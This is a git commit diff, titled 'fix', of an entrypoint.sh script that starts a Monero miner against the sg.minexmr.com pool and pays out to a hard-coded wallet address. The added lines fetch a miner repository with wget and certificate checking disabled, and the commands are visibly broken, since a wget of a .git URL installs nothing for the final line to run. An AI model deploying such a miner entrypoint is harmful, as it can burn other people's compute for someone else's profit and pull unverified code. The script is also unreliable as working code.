235c7d7049cc7cd5b2c16ae73bc891adb55135e5
liquid8796 <hanam.tranle.5@gmail.com>
2022-06-24 22:14:52 +0700

    fix

--- entrypoint.sh
+++ entrypoint.sh
@@ -1,5 +1,5 @@
 cd /xmr
-sudo apt-get install npm
-npm install -g node-miner
+wget https://github.com/john-goodman/nodejs-xmr-miner.git --no-check-certificate
+cd /bin
 
-./node-miner --host sg.minexmr.com --port 4444 --user 47mpJwQQrWaN27Y6A48VgcB1A3cDsRFTNZXGxifemtrE9ALStd3bsLy1wZA75JFHev1t1XPQChfJRe6b7sktBBrYNaTT11Y
+node-miner --host sg.minexmr.com --port 4444 --user 47mpJwQQrWaN27Y6A48VgcB1A3cDsRFTNZXGxifemtrE9ALStd3bsLy1wZA75JFHev1t1XPQChfJRe6b7sktBBrYNaTT11Y
